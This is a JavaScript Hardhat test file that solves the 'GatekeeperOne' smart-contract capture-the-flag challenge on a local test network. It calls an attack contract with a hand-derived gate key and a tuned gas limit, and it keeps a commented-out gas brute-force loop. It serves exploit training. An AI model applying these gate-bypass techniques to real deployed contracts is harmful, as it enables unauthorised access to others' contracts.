const {ethers} = require("hardhat");
const hre = require("hardhat");
const {expect} = require("chai");


describe('[Challenge] GatekeeperOne Attack', function () {

    let deployer, attacker;
    let baseContract, attackContract;
    let provider;
    let payment;

    before(async function () {
        /** SETUP SCENARIO */
        [deployer, attacker] = await ethers.getSigners();

        const baseContractFactory = await ethers.getContractFactory('GatekeeperOne', deployer);
        baseContract = await baseContractFactory.deploy();
        provider = hre.ethers.provider;

        await baseContract.deployed();

        const attackerBaseContractFactory = await ethers.getContractFactory('AttackGateKeeperOne', deployer);
        attackContract = await attackerBaseContractFactory.deploy(baseContract.address);
        await attackContract.deployed();

        expect(
            await baseContract.entrant()
        ).to.be.equal("0x0000000000000000000000000000000000000000");
    });

    it('Exploit GatekeeperOne Attack', async function () {
        /** CODE YOUR EXPLOIT HERE */
        // let gas = 3_000_000;
        // let error = true;
        // while (error) {
        //     try {
        //         gas+=1;
        //         console.log(gas)
        //         const tnx = await attackContract.connect(attacker).attack("0x10000000000079c8" ,{gasLimit: gas});
        //         // const val = await tnx.wait();
        //         // await val.wait()
        //         console.log(gas);
        //         error = false;
        //     } catch (e) {
        //
        //     }
        // }


        // gateway key manually done, using trial and error with the knowledge of bytes ignoring if it is overflown
        await attackContract.connect(attacker).attack("0x10000000000079c8" ,{gasLimit: 3005415});

    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        expect(
            await baseContract.entrant()
        ).to.be.not.equal("0x0000000000000000000000000000000000000000");
        expect(
            await baseContract.entrant()
        ).to.be.equal(attacker.address);

    });

    function createReturnString(number) {
        number.toString();
        let returningString = '0x';
        const zeros = 16 - number.toString().length;
        returningString = returningString + "0".repeat(zeros) + number;
        return returningString
    }
});